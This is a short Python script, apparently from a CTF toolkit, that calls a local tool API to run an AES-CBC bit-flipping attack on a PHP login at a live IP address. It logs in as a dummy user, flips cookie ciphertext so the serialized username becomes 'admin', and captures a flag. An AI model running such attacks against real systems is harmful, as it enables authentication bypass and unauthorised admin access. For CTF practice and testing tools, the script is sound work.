# -*- coding: utf-8 -*-
"""在线验证 crypto.aes_cbc_bitflip 的 attack 模式，打真实靶机 14607。"""
import json
import time
import urllib.request

API = "http://127.0.0.1:8000"
TOOL = "crypto.aes_cbc_bitflip"

PLAIN = 'a:2:{s:8:"username";s:5:"aaaaa";s:8:"password";s:5:"ppppp";}'


def main():
    req = urllib.request.Request(
        API + f"/api/tools/{TOOL}/run",
        data=json.dumps({"params": {
            "mode": "attack",
            "plaintext": PLAIN,
            "orig": "aaaaa",
            "target": "admin",
            "encoding": "ascii",
            "login_url": "http://160.202.254.160:17225/",
            "login_method": "POST",
            "login_params": "username=aaaaa&password=ppppp&submit=Login",
            "replay_method": "GET",
            "replay_params": "",
            "session_cookie": "PHPSESSID",
            "iv_cookie": "iv",
            "cipher_cookie": "cipher",
            "leak_regex": "base64_decode\\('([A-Za-z0-9+/=]+)'\\)",
            "leak_encoding": "base64",
            "success_regex": "flag\\{[^}]+\\}",
            "interval": 1,
        }}).encode(),
        headers={"Content-Type": "application/json"},
    )
    resp = json.load(urllib.request.urlopen(req, timeout=30))
    job_id = resp.get("job_id") or resp.get("id") or resp.get("task_id")
    print("job_id =", job_id)
    for _ in range(150):  # 最长 ~5 分钟
        r = json.load(urllib.request.urlopen(API + f"/api/tasks/{job_id}", timeout=30))
        status = (r.get("status") or "").lower()
        if status in ("success", "error", "failed", "done", "complete"):
            break
        time.sleep(2)
    else:
        print("任务超时未结束")
        return
    res = r.get("result") or {}
    print("status =", r.get("status"))
    print("=" * 70)
    print(res.get("stdout") or r)
    if res.get("stderr"):
        print("stderr:", res.get("stderr"))


if __name__ == "__main__":
    main()
